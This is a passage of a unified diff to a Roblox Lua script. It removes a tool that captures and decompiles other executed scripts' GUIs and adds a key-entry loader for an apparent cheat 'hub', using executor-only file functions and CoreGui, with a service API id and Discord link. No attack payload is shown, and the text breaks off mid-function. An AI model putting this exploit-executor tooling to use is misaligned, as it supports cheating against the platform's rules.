@@ -1,429 +1,518 @@
--- Novoline Interactive Guided Decompiler & Code Generator
-local Players = game:GetService("Players")
-local CoreGui = game:GetService("CoreGui")
+--[[
+	WARNING: Key System Loader for R4 VR Hideout Hub
+]]
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
 
-local localPlayer = Players.LocalPlayer
-local playerGui = localPlayer:WaitForChild("PlayerGui")
+local LocalPlayer = Players.LocalPlayer
 
--- Supported UI properties for decompilation
-local propertiesToDump = {
-	Common = {"Name", "Size", "Position", "AnchorPoint", "BackgroundColor3", "BackgroundTransparency", "BorderSizePixel", "ZIndex", "Visible"},
-	Frame = {},
-	ScrollingFrame = {"CanvasSize", "ScrollBarThickness", "ScrollBarImageColor3", "ScrollingDirection"},
-	TextLabel = {"Text", "TextColor3", "TextSize", "Font", "TextWrapped", "TextScaled", "TextXAlignment", "TextYAlignment"},
-	TextButton = {"Text", "TextColor3", "TextSize", "Font", "TextWrapped", "TextScaled", "TextXAlignment", "TextYAlignment"},
-	TextBox = {"Text", "TextColor3", "TextSize", "Font", "PlaceholderText", "PlaceholderColor3", "TextXAlignment", "TextYAlignment", "ClearTextOnFocus"},
-	ImageLabel = {"Image", "ImageColor3", "ImageTransparency", "ScaleType"},
-	ImageButton = {"Image", "ImageColor3", "ImageTransparency", "ScaleType"},
-	UICorner = {"CornerRadius"},
-	UIStroke = {"Color", "Thickness", "Transparency", "ApplyStrokeMode"},
-	UIPadding = {"PaddingTop", "PaddingBottom", "PaddingLeft", "PaddingRight"},
-	UIListLayout = {"Padding", "FillDirection", "HorizontalAlignment", "VerticalAlignment", "SortOrder"},
-	UIGridLayout = {"CellPadding", "CellSize", "FillDirection", "HorizontalAlignment", "VerticalAlignment", "SortOrder"}
+local cfg = {
+    api = "86380f5e-7c93-4ffd-84cf-ec5bf00080f3",
+    service = "hoodlandon vr hub",
+    provider = "put your junkie provider name here", -- Replace with your Junkie provider name!
+    discord = "https://discord.gg/3nsMRHdv7r",
+    logo = "rbxassetid://121595097202790",
+    barColor = Color3.fromRGB(90, 170, 255),
+    keyFile = "&R4_key2.txt"
 }
 
-local function serializeValue(val)
-	if type(val) == "string" then
-		return '"' .. val .. '"'
-	elseif type(val) == "number" or type(val) == "boolean" then
-		return tostring(val)
-	elseif typeof(val) == "Color3" then
-		return "Color3.fromRGB(" .. math.round(val.R*255) .. ", " .. math.round(val.G*255) .. ", " .. math.round(val.B*255) .. ")"
-	elseif typeof(val) == "UDim2" then
-		return "UDim2.new(" .. val.X.Scale .. ", " .. val.X.Offset .. ", " .. val.Y.Scale .. ", " .. val.Y.Offset .. ")"
-	elseif typeof(val) == "UDim" then
-		return "UDim.new(" .. val.Scale .. ", " .. val.Offset .. ")"
-	elseif typeof(val) == "Vector2" then
-		return "Vector2.new(" .. val.X .. ", " .. val.Y .. ")"
-	elseif typeof(val) == "EnumItem" then
-		return tostring(val)
-	end
-	return nil
+local notifActive = {}
+
+local function createNotification(title, content, length, iconId)
+    local screen = Instance.new("ScreenGui")
+    screen.Name = "NotifGui"
+    screen.ResetOnSpawn = false
+    screen.DisplayOrder = 2147483647
+    screen.Parent = CoreGui
+
+    local scale = math.clamp(math.min(workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y)/1366, 0.6, 1.6)
+    local w = math.clamp(320*scale, 200, 520)
+    local h = math.clamp(72*scale, 54, 140)
+
+    local main = Instance.new("Frame")
+    main.Size = UDim2.new(0, w, 0, h)
+    main.Position = UDim2.new(1, -12, 1, -12-h-16)
+    main.AnchorPoint = Vector2.new(1, 1)
+    main.BackgroundTransparency = 0
+    main.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
+    main.BorderSizePixel = 0
+    main.Parent = screen
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 10)
+    corner.Parent = main
+
+    local bar = Instance.new("Frame")
+    bar.Size = UDim2.new(1, 0, 0, 4)
+    bar.Position = UDim2.new(0, 0, 1, -4)
+    bar.BackgroundColor3 = cfg.barColor
+    bar.BorderSizePixel = 0
+    bar.ClipsDescendants = true
+    bar.Parent = main
+
+    local barCorner = Instance.new("UICorner")
+    barCorner.CornerRadius = UDim.new(0, 2)
+    barCorner.Parent = bar
+
+    local fill = Instance.new("Frame")
+    fill.Size = UDim2.new(1, 0, 1, 0)
+    fill.Position = UDim2.new(0, 0, 0, 0)
+    fill.BackgroundColor3 = cfg.barColor
+    fill.BorderSizePixel = 0
+    fill.Parent = bar
+
+    local icon = Instance.new("ImageLabel")
+    icon.Size = UDim2.new(0, h, 1, 0)
+    icon.Position = UDim2.new(0, 0, 0, 0)
+    icon.BackgroundTransparency = 1
+    icon.Image = iconId or cfg.logo
+    icon.ImageColor3 = cfg.barColor
+    icon.ScaleType = Enum.ScaleType.Stretch
+    icon.Parent = main
+
+    local txt = Instance.new("TextLabel")
+    txt.BackgroundTransparency = 1
+    txt.Size = UDim2.new(1, -h-8, 0.4, 0)
+    txt.Position = UDim2.new(0, h+8, 0, 0)
+    txt.Font = Enum.Font.Code
+    txt.TextSize = math.clamp(14*scale, 12, 20)
+    txt.TextXAlignment = Enum.TextXAlignment.Left
+    txt.TextYAlignment = Enum.TextYAlignment.Top
+    txt.TextColor3 = Color3.new(1, 1, 1)
+    txt.Text = title
+    txt.Parent = main
+
+    local sub = Instance.new("TextLabel")
+    sub.BackgroundTransparency = 1
+    sub.Size = UDim2.new(1, -h-8, 0.5, 0)
+    sub.Position = UDim2.new(0, h+8, 0.4, 0)
+    sub.Font = Enum.Font.Code
+    sub.TextSize = math.clamp(12*scale, 10, 16)
+    sub.TextXAlignment = Enum.TextXAlignment.Left
+    sub.TextYAlignment = Enum.TextYAlignment.Top
+    sub.TextColor3 = Color3.fromRGB(200, 200, 200)
+    sub.Text = content
+    sub.TextWrapped = true
+    sub.Parent = main
+
+    local id = tostring(math.floor(tick()*1000)).."-"..HttpService:GenerateGUID(false)
+    table.insert(notifActive, {id = id, frame = main, sizeY = h})
+
+    local function restack()
+        local spacing = 8*scale
+        local yoff = 0
+        for i = #notifActive, 1, -1 do
+            local node = notifActive[i]
+            if node and node.frame and node.frame.Parent then
+                local target = -12-yoff-node.sizeY
+                TweenService:Create(node.frame, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(1, -12, 1, target)}):Play()
+                yoff = yoff + node.sizeY + spacing
+            end
+        end
+    end
+
+    restack()
+
+    local function destroy()
+        for i = 1, #notifActive do
+            if notifActive[i].id == id then
+                table.remove(notifActive, i)
+                break
+            end
+        end
+        TweenService:Create(main, TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(1, 16, main.Position.Y.Scale, main.Position.Y.Offset), BackgroundTransparency = 1}):Play()
+        TweenService:Create(txt, TweenInfo.new(0.35), {TextTransparency = 1}):Play()
+        TweenService:Create(sub, TweenInfo.new(0.35), {TextTransparency = 1}):Play()
+        TweenService:Create(icon, TweenInfo.new(0.35), {ImageTransparency = 1}):Play()
+        task.wait(0.35)
+        pcall(function() screen:Destroy() end)
+        restack()
+    end
+
+    if length and length > 0 then
+        TweenService:Create(fill, TweenInfo.new(length, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 1, 0)}):Play()
+        task.delay(length, destroy)
+    end
+
+    local btn = Instance.new("TextButton")
+    btn.Size = UDim2.new(1, 0, 1, 0)
+    btn.BackgroundTransparency = 1
+    btn.Text = ""
+    btn.ZIndex = 10
+    btn.Parent = main
+    btn.MouseButton1Click:Connect(destroy)
+
+    return {Close = destroy}
 end
 
-local function decompileGui(targetGui)
-	local code = {
-		"-- Generated with Novoline Interactive UI Decompiler",
-		"local gui = Instance.new(\"ScreenGui\")",
-		"gui.Name = \"" .. targetGui.Name .. "\"",
-		"gui.ResetOnSpawn = false",
-		"gui.Parent = game:GetService(\"CoreGui\") or game:GetService(\"Players\").LocalPlayer:WaitForChild(\"PlayerGui\")",
-		""
-	}
-	local varMap = {}
-	local varCount = 0
-
-	local function getVarName(inst)
-		if inst == targetGui then return "gui" end
-		varCount = varCount + 1
-		return inst.ClassName .. "_" .. varCount
-	end
-
-	local function processInstance(inst, parentVar)
-		local myVar = getVarName(inst)
-		varMap[inst] = myVar
-
-		if inst ~= targetGui then
-			table.insert(code, "local " .. myVar .. ' = Instance.new("' .. inst.ClassName .. '")')
-		end
-
-		local props = {}
-		for _, p in ipairs(propertiesToDump.Common) do
-			pcall(function() props[p] = inst[p] end)
-		end
-
-		local classProps = propertiesToDump[inst.ClassName]
-		if classProps then
-			for _, p in ipairs(classProps) do
-				pcall(function() props[p] = inst[p] end)
-			end
-		end
-
-		for k, v in pairs(props) do
-			if k ~= "Name" or inst ~= targetGui then
-				local sVal = serializeValue(v)
-				if sVal then
-					table.insert(code, myVar .. "." .. k .. " = " .. sVal)
-				end
-			end
-		end
-
-		if parentVar and inst ~= targetGui then
-			table.insert(code, myVar .. ".Parent = " .. parentVar)
-		end
-		table.insert(code, "")
-
-		for _, child in ipairs(inst:GetChildren()) do
-			processInstance(child, myVar)
-		end
-	end
-
-	processInstance(targetGui, nil)
-	return table.concat(code, "\n")
+local function saveKey(key)
+    if writefile then
+        pcall(function() writefile(cfg.keyFile, key) end)
+    end
 end
 
--- Construct Wizard GUI
-local wizardScreen = Instance.new("ScreenGui")
-wizardScreen.Name = "NovolineDecompiler"
-wizardScreen.ResetOnSpawn = false
-wizardScreen.Parent = CoreGui or playerGui
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 320, 0, 180)
-frame.Position = UDim2.new(0.5, -160, 0.5, -90)
-frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-frame.BorderSizePixel = 0
-frame.Parent = wizardScreen
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = frame
-
-local stroke = Instance.new("UIStroke")
-stroke.Color = Color3.fromRGB(0, 180, 255)
-stroke.Thickness = 1.5
-stroke.Parent = frame
-
-local topBar = Instance.new("Frame")
-topBar.Size = UDim2.new(1, 0, 0, 35)
-topBar.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
-topBar.BorderSizePixel = 0
-topBar.Parent = frame
-
-local topCorner = Instance.new("UICorner")
-topCorner.CornerRadius = UDim.new(0, 8)
-topCorner.Parent = topBar
-
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, -40, 1, 0)
-title.Position = UDim2.new(0, 10, 0, 0)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.Text = "Novoline Guided Decompiler"
-title.TextColor3 = Color3.fromRGB(0, 180, 255)
-title.TextSize = 12
-title.TextXAlignment = Enum.TextXAlignment.Left
-title.Parent = topBar
-
-local closeBtn = Instance.new("TextButton")
-closeBtn.Size = UDim2.new(0, 30, 1, 0)
-closeBtn.Position = UDim2.new(1, -30, 0, 0)
-closeBtn.BackgroundTransparency = 1
-closeBtn.Font = Enum.Font.GothamBold
-closeBtn.Text = "×"
-closeBtn.TextColor3 = Color3.fromRGB(150, 150, 150)
-closeBtn.TextSize = 18
-closeBtn.Parent = topBar
-closeBtn.Active = true
-
-local contentText = Instance.new("TextLabel")
-contentText.Size = UDim2.new(1, -20, 0, 80)
-contentText.Position = UDim2.new(0, 10, 0, 45)
-contentText.BackgroundTransparency = 1
-contentText.Font = Enum.Font.GothamMedium
-contentText.Text = "Welcome to the guided decompiler.\n\nPress Start below to begin."
-contentText.TextColor3 = Color3.fromRGB(200, 200, 200)
-contentText.TextSize = 11
-contentText.TextWrapped = true
-contentText.Parent = frame
-
--- Main Action Button (Dynamically Resized)
-local actionBtn = Instance.new("TextButton")
-actionBtn.Size = UDim2.new(1, -20, 0, 35)
-actionBtn.Position = UDim2.new(0, 10, 1, -45)
-actionBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 220)
-actionBtn.Font = Enum.Font.GothamBold
-actionBtn.Text = "START"
-actionBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-actionBtn.TextSize = 12
-actionBtn.Parent = frame
-actionBtn.Active = true
-
-local actionCorner = Instance.new("UICorner")
-actionCorner.CornerRadius = UDim.new(0, 6)
-actionCorner.Parent = actionBtn
-
--- Dynamic Skip Button (For Tapping Phase)
-local skipBtn = Instance.new("TextButton")
-skipBtn.Name = "SkipBtn"
-skipBtn.Size = UDim2.new(0, 140, 0, 35)
-skipBtn.Position = UDim2.new(0, 10, 1, -45)
-skipBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-skipBtn.Font = Enum.Font.GothamBold
-skipBtn.Text = "SKIP ⏩"
-skipBtn.TextColor3 = Color3.fromRGB(240, 240, 240)
-skipBtn.TextSize = 11
-skipBtn.Visible = false
-skipBtn.Active = true
-skipBtn.Parent = frame
-
-local skipCorner = Instance.new("UICorner")
-skipCorner.CornerRadius = UDim.new(0, 6)
-skipCorner.Parent = skipBtn
-
-local skipStroke = Instance.new("UIStroke")
-skipStroke.Color = Color3.fromRGB(45, 45, 45)
-skipStroke.Thickness = 1
-skipStroke.Parent = skipBtn
-
--- Bounding-Box Highlight Frame
-local highlightFrame = Instance.new("Frame")
-highlightFrame.BackgroundTransparency = 1
-highlightFrame.Size = UDim2.new(1, 0, 1, 0)
-local highlightStroke = Instance.new("UIStroke")
-highlightStroke.Color = Color3.fromRGB(0, 180, 255)
-highlightStroke.Thickness = 3
-highlightStroke.Parent = highlightFrame
-
--- Notepad Logs Frame (Initially Hidden)
-local logsFrame = Instance.new("Frame")
-logsFrame.Size = UDim2.new(1, -20, 1, -100)
-logsFrame.Position = UDim2.new(0, 10, 0, 45)
-logsFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-logsFrame.BorderSizePixel = 0
-logsFrame.Visible = false
-logsFrame.Parent = frame
-
-local logsCorner = Instance.new("UICorner")
-logsCorner.CornerRadius = UDim.new(0, 6)
-logsCorner.Parent = logsFrame
-
-local logsScroll = Instance.new("ScrollingFrame")
-logsScroll.Size = UDim2.new(1, -10, 1, -10)
-logsScroll.Position = UDim2.new(0, 5, 0, 5)
-logsScroll.BackgroundTransparency = 1
-logsScroll.BorderSizePixel = 0
-logsScroll.ScrollBarThickness = 4
-logsScroll.ScrollBarImageColor3 = Color3.fromRGB(0, 180, 255)
-logsScroll.Parent = logsFrame
-
-local logsBox = Instance.new("TextBox")
-logsBox.Size = UDim2.new(1, 0, 1, 0)
-logsBox.BackgroundTransparency = 1
-logsBox.Font = Enum.Font.Code
-logsBox.Text = ""
-logsBox.TextColor3 = Color3.fromRGB(180, 220, 255)
-logsBox.TextSize = 10
-logsBox.TextWrapped = true
-logsBox.TextXAlignment = Enum.TextXAlignment.Left
-logsBox.TextYAlignment = Enum.TextYAlignment.Top
-logsBox.MultiLine = true
-logsBox.ClearTextOnFocus = false
-logsBox.TextEditable = false
-logsBox.Parent = logsScroll
-
--- Dragging logic for top bar
-local dragging, dragInput, dragStart, startPos
-topBar.InputBegan:Connect(function(input)
-	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-		dragging = true
-		dragStart = input.Position
-		startPos = frame.Position
-		input.Changed:Connect(function()
-			if input.UserInputState == Enum.UserInputState.End then dragging = false end
-		end)
-	end
-end)
-UserInputService.InputChanged:Connect(function(input)
-	if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-	end
-end)
-
--- Guided States
-local currentStep = 1
-local targetGui = nil
-local selectedElement = nil
-local hookConnections = {}
-local scanCore, scanPlayer
-local detectedGuis = {}
-
-local function cleanHookConnections()
-	for _, conn in ipairs(hookConnections) do
-		if conn.Connected then conn:Disconnect() end
-	end
-	hookConnections = {}
+local function loadKey()
+    if readfile then
+        local ok, data = pcall(function() return readfile(cfg.keyFile) end)
+        if ok and data then return data end
+    end
+    return ""
 end
 
-local function finishAndDisplayLogs(generatedCode)
-	cleanHookConnections()
-	highlightFrame.Parent = nil
+local function buildUI()
+    local Part1 = {}
+    local Part2 = {}
+    local Part3 = {}
 
-	-- Resize main frame to log mode
-	frame.Size = UDim2.new(0, 460, 0, 380)
-	frame.Position = UDim2.new(0.5, -230, 0.5, -190)
+    Part1.Screen = Instance.new("ScreenGui")
+    Part1.Screen.Name = "&R4 Tuff"
+    Part1.Screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
+    Part1.Screen.ResetOnSpawn = false
+    Part1.Screen.IgnoreGuiInset = true
+    Part1.Screen.Parent = CoreGui
 
-	contentText.Visible = false
-	skipBtn.Visible = false
-	logsFrame.Visible = true
-	logsBox.Text = generatedCode
+    Part1.Main = Instance.new("Frame")
+    Part1.Main.Name = "Main"
+    Part1.Main.Size = UDim2.new(0, 370, 0, 200)
+    Part1.Main.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Part1.Main.AnchorPoint = Vector2.new(0.5, 0.5)
+    Part1.Main.BackgroundColor3 = Color3.fromRGB(20, 30, 50)
+    Part1.Main.BackgroundTransparency = 0
+    Part1.Main.BorderSizePixel = 0
+    Part1.Main.ClipsDescendants = false
+    Part1.Main.Parent = Part1.Screen
 
-	-- Adjust Scroll Canvas Height
-	local textHeight = logsBox.TextBounds.Y
-	logsScroll.CanvasSize = UDim2.new(0, 0, 0, textHeight + 20)
+    Part1.Corner = Instance.new("UICorner")
+    Part1.Corner.CornerRadius = UDim.new(0, 10)
+    Part1.Corner.Parent = Part1.Main
 
-	-- Full-width copy button placement
-	actionBtn.Size = UDim2.new(1, -20, 0, 35)
-	actionBtn.Position = UDim2.new(0, 10, 1, -45)
-	actionBtn.Text = "📋 COPY LOGS TO CLIPBOARD"
-	actionBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
-	actionBtn.Active = true
-	currentStep = 4
+    Part2.Top = Instance.new("Frame")
+    Part2.Top.Name = "Top"
+    Part2.Top.Size = UDim2.new(1, 0, 0, 35)
+    Part2.Top.Position = UDim2.new(0, 0, 0, 0)
+    Part2.Top.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
+    Part2.Top.BorderSizePixel = 0
+    Part2.Top.Parent = Part1.Main
+
+    Part2.TopCorner = Instance.new("UICorner")
+    Part2.TopCorner.CornerRadius = UDim.new(0, 10)
+    Part2.TopCorner.Parent = Part2.Top
+
+    Part2.TopCover = Instance.new("Frame")
+    Part2.TopCover.Name = "TopCover"
+    Part2.TopCover.Size = UDim2.new(1, 0, 0, 20)
+    Part2.TopCover.Position = UDim2.new(0, 0, 1, -20)
+    Part2.TopCover.BackgroundColor3 = Color3.fromRGB(30, 60, 100)
+    Part2.TopCover.BorderSizePixel = 0
+    Part2.TopCover.Parent = Part2.Top
+
+    Part2.Line = Instance.new("Frame")
+    Part2.Line.Name = "Line"
+    Part2.Line.Size = UDim2.new(1, 0, 0, 1)
+    Part2.Line.Position = UDim2.new(0, 0, 1, 0)
+    Part2.Line.BackgroundColor3 = Color3.fromRGB(25, 50, 90)
+    Part2.Line.BorderSizePixel = 0
+    Part2.Line.Parent = Part2.Top
+
+    Part2.Logo = Instance.new("ImageLabel")
+    Part2.Logo.Name = "Logo"
+    Part2.Logo.Size = UDim2.new(0, 20, 0, 20)
+    Part2.Logo.Position = UDim2.new(0, 10, 0, 7)
+    Part2.Logo.BackgroundTransparency = 1
+    Part2.Logo.Image = cfg.logo
+    Part2.Logo.ImageColor3 = cfg.barColor
+    Part2.Logo.Parent = Part2.Top
+
+    Part2.Title = Instance.new("TextLabel")
+    Part2.Title.Name = "Title"
+    Part2.Title.Size = UDim2.new(0, 100, 0, 35)
+    Part2.Title.Position = UDim2.new(0, 35, 0, 0)
+    Part2.Title.BackgroundTransparency = 1
+    Part2.Title.Text = "&R4 Hideout"
+    Part2.Title.TextColor3 = Color3.fromRGB(200, 230, 255)
+    Part2.Title.TextSize = 18
+    Part2.Title.Font = Enum.Font.GothamBold
+    Part2.Title.TextXAlignment = Enum.TextXAlignment.Left
+    Part2.Title.Parent = Part2.Top
+
+    Part2.Close = Instance.new("ImageButton")
+    Part2.Close.Name = "Close"
+    Part2.Close.Size = UDim2.new(0, 20, 0, 20)
+    Part2.Close.Position = UDim2.new(1, -10, 0.5, 0)
+    Part2.Close.AnchorPoint = Vector2.new(1, 0.5)
+    Part2.Close.BackgroundTransparency = 1
+    Part2.Close.Image = "rbxassetid://122931434733842"
+    Part2.Close.ImageColor3 = Color3.fromRGB(200, 230, 255)
+    Part2.Close.ScaleType = Enum.ScaleType.Fit
+    Part2.Close.Parent = Part2.Top
+
+    Part3.Input = Instance.new("Frame")
+    Part3.Input.Name = "Input"
+    Part3.Input.Size = UDim2.new(0.9, 0, 0, 35)
+    Part3.Input.Position = UDim2.new(0.5, 0, 0, 60)
+    Part3.Input.AnchorPoint = Vector2.new(0.5, 0)
+    Part3.Input.BackgroundColor3 = Color3.fromRGB(15, 35, 65)
+    Part3.Input.BackgroundTransparency = 0.3
+    Part3.Input.BorderSizePixel = 0
+    Part3.Input.Parent = Part1.Main
+
+    Part3.InputStroke = Instance.new("UIStroke")
+    Part3.InputStroke.Color = cfg.barColor
+    Part3.InputStroke.Thickness = 1
+    Part3.InputStroke.Transparency = 0.5
+    Part3.InputStroke.Parent = Part3.Input
+
+    Part3.InputCorner = Instance.new("UICorner")
+    Part3.InputCorner.CornerRadius = UDim.new(0, 6)
+    Part3.InputCorner.Parent = Part3.Input
+
+    Part3.Box = Instance.new("TextBox")
+    Part3.Box.Name = "Box"
+    Part3.Box.Size = UDim2.new(0.9, 0, 1, 0)
+    Part3.Box.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Part3.Box.AnchorPoint = Vector2.new(0.5, 0.5)
+    Part3.Box.BackgroundTransparency = 1
+    Part3.Box.Text = loadKey()
+    Part3.Box.TextColor3 = Color3.fromRGB(200, 230, 255)
+    Part3.Box.PlaceholderText = "00000000-0000-0000-0000-000000000000"
+    Part3.Box.PlaceholderColor3 = Color3.fromRGB(100, 120, 150)
+    Part3.Box.TextSize = 14
+    Part3.Box.Font = Enum.Font.Gotham
+    Part3.Box.ClearTextOnFocus = false
+    Part3.Box.Parent = Part3.Input
+
+    Part3.Buttons = Instance.new("Frame")
+    Part3.Buttons.Name = "Buttons"
+    Part3.Buttons.Size = UDim2.new(0.9, 0, 0, 30)
+    Part3.Buttons.Position = UDim2.new(0.5, 0, 1, -40)
+    Part3.Buttons.AnchorPoint = Vector2.new(0.5, 1)
+    Part3.Buttons.BackgroundTransparency = 1
+    Part3.Buttons.Parent = Part1.Main
+
+    local btnColor = Color3.fromRGB(30, 80, 150)
+
+    Part3.GetKey = Instance.new("TextButton")
+    Part3.GetKey.Name = "GetKey"
+    Part3.GetKey.Size = UDim2.new(0.45, -4, 1, 0)
+    Part3.GetKey.Position = UDim2.new(0.25, 0, 0, 0)
+    Part3.GetKey.AnchorPoint = Vector2.new(0.5, 0)
+    Part3.GetKey.BackgroundColor3 = btnColor
+    Part3.GetKey.BorderSizePixel = 0
+    Part3.GetKey.Text = ""
+    Part3.GetKey.AutoButtonColor = false
+    Part3.GetKey.Parent = Part3.Buttons
+
+    local getKeyIco = Instance.new("ImageLabel")
+    getKeyIco.Size = UDim2.new(0, 16, 0, 16)
+    getKeyIco.Position = UDim2.new(0.5, -20, 0.5, 0)
+    getKeyIco.AnchorPoint = Vector2.new(0.5, 0.5)
+    getKeyIco.BackgroundTransparency = 1
+    getKeyIco.Image = "rbxassetid://96510194465420"
+    getKeyIco.ImageColor3 = Color3.new(1, 1, 1)
+    getKeyIco.Parent = Part3.GetKey
+
+    local getKeyTxt = Instance.new("TextLabel")
+    getKeyTxt.Size = UDim2.new(1, 0, 1, 0)
+    getKeyTxt.Position = UDim2.new(0.5, 8, 0, 0)
+    getKeyTxt.AnchorPoint = Vector2.new(0.5, 0)
+    getKeyTxt.BackgroundTransparency = 1
+    getKeyTxt.Text = "Get Key"
+    getKeyTxt.TextColor3 = Color3.new(1, 1, 1)
+    getKeyTxt.TextSize = 12
+    getKeyTxt.Font = Enum.Font.GothamBold
+    getKeyTxt.Parent = Part3.GetKey
+
+    Part3.GetKeyCorner = Instance.new("UICorner")
+    Part3.GetKeyCorner.CornerRadius = UDim.new(0, 8)
+    Part3.GetKeyCorner.Parent = Part3.GetKey
+
+    Part3.Verify = Instance.new("TextButton")
+    Part3.Verify.Name = "Verify"
+    Part3.Verify.Size = UDim2.new(0.45, -4, 1, 0)
+    Part3.Verify.Position = UDim2.new(0.75, 0, 0, 0)
+    Part3.Verify.AnchorPoint = Vector2.new(0.5, 0)
+    Part3.Verify.BackgroundColor3 = btnColor
+    Part3.Verify.BorderSizePixel = 0
+    Part3.Verify.Text = ""
+    Part3.Verify.AutoButtonColor = false
+    Part3.Verify.Parent = Part3.Buttons
+
+    local verifyIco = Instance.new("ImageLabel")
+    verifyIco.Size = UDim2.new(0, 16, 0, 16)
+    verifyIco.Position = UDim2.new(0.5, -20, 0.5, 0)
+    verifyIco.AnchorPoint = Vector2.new(0.5, 0.5)
+    verifyIco.BackgroundTransparency = 1
+    verifyIco.Image = "rbxassetid://87354736164608"
+    verifyIco.ImageColor3 = Color3.new(1, 1, 1)
+    verifyIco.Parent = Part3.Verify
+
+    local verifyTxt = Instance.new("TextLabel")
+    verifyTxt.Size = UDim2.new(1, 0, 1, 0)
+    verifyTxt.Position = UDim2.new(0.5, 8, 0, 0)
+    verifyTxt.AnchorPoint = Vector2.new(0.5, 0)
+    verifyTxt.BackgroundTransparency = 1
+    verifyTxt.Text = "Verify"
+    verifyTxt.TextColor3 = Color3.new(1, 1, 1)
+    verifyTxt.TextSize = 12
+    verifyTxt.Font = Enum.Font.GothamBold
+    verifyTxt.Parent = Part3.Verify
+
+    Part3.VerifyCorner = Instance.new("UICorner")
+    Part3.VerifyCorner.CornerRadius = UDim.new(0, 8)
+    Part3.VerifyCorner.Parent = Part3.Verify
+
+    return {
+        gui = Part1.Screen,
+        main = Part1.Main,
+        box = Part3.Box,
+        verify = Part3.Verify,
+        getKey = Part3.GetKey,
+        close = Part2.Close,
+        top = Part2.Top
+    }
 end
 
-local function startTappingPhase()
-	currentStep = 3
-	contentText.Text = "Step 2/3: Touch targeting active.\n\nTarget GUI: [" .. targetGui.Name .. "]\n\nTap on any part of the GUI to highlight, or click SKIP to generate immediately."
-	
-	-- Half-width button alignments
-	skipBtn.Visible = true
-	actionBtn.Size = UDim2.new(0, 140, 0, 35)
-	actionBtn.Position = UDim2.new(1, -150, 1, -45)
-	actionBtn.Text = "Waiting..."
-	actionBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-	actionBtn.Active = false
-
-	-- Setup touch hooks on the detected GUI descendants
-	local function hookElements()
-		cleanHookConnections()
-		for _, obj in ipairs(targetGui:GetDescendants()) do
-			if obj:IsA("GuiObject") then
-				local conn = obj.InputBegan:Connect(function(input)
-					if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-						selectedElement = obj
-						highlightFrame.Parent = obj -- Outline the selected element
-						
-						contentText.Text = "Step 3/3: Bounding-box locked on [" .. obj.Name .. "]\n\nPress OK below to generate the code logs, or click SKIP."
-						actionBtn.Text = "OK"
-						actionBtn.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
-						actionBtn.Active = true
-					end
-				end)
-				table.insert(hookConnections, conn)
-			end
-		end
-	end
-	hookElements()
+local function drag(ui)
+    local dragInput, dragStart, startPos
+    ui.top.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragInput = inp
+            dragStart = inp.Position
+            startPos = ui.main.Position
+            inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragInput = nil end end)
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(inp)
+        if inp == dragInput and inp.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = inp.Position - dragStart
+            ui.main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
 end
 
-local function startWatchingPhase()
-	currentStep = 2
-	contentText.Text = "Step 1/3: Watching for executions...\n\nExecute your other GUI script now. We will monitor the background."
-	actionBtn.Text = "NEXT"
-	actionBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 220)
-	actionBtn.Active = true
-
-	-- Connection detectors
-	local function onChildAdded(child)
-		if child:IsA("ScreenGui") and child.Name ~= "NovolineDecompiler" then
-			-- Ensure unique registry
-			local alreadyAdded = false
-			for _, g in ipairs(detectedGuis) do
-				if g == child then alreadyAdded = true break end
-			end
-			
-			if not alreadyAdded then
-				table.insert(detectedGuis, child)
-				targetGui = child -- Default to most recently loaded GUI
-
-				local names = {}
-				for _, g in ipairs(detectedGuis) do
-					table.insert(names, g.Name)
-				end
-				contentText.Text = "Step 1/3: Watching for executions...\n\nCurrently Detected:\n" .. table.concat(names, ", ") .. "\n\nExecute more scripts, or click NEXT when ready."
-			end
-		end
-	end
-
-	scanCore = CoreGui.ChildAdded:Connect(onChildAdded)
-	scanPlayer = playerGui.ChildAdded:Connect(onChildAdded)
+local function pulse(btn)
+    local orig = btn.BackgroundColor3
+    local pop = Color3.new(math.min(orig.R*1.3, 1), math.min(orig.G*1.3, 1), math.min(orig.B*1.3, 1))
